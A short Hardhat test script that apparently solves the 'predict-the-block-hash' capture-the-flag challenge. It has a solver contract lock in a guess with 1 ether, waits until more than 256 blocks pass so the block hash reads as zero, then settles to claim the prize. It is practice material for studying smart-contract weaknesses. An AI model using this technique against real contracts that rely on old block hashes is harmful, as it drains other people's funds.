import { ethers } from "hardhat"

function sleep(ms: number) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

describe("predict-the-block-hash", function () {
  it("should predict the block hash", async function () {
    const chalAddr = ""
    const solAddr = ""

    const sol = await ethers.getContractAt("PredictTheBlockHashChallengeSolver", solAddr)
    const tx = await sol.lockInGuess(chalAddr, {value: ethers.utils.parseEther("1")})
    const rx = await tx.wait()

    while (true) {
      const block = await ethers.provider.getBlock(rx.blockNumber + 1 + 256)
      if (block !== null)
        break
      await sleep(1000 * 60 * 5)
    }

    const tx2 = await sol.settle(chalAddr)
    await tx2.wait()
  })
})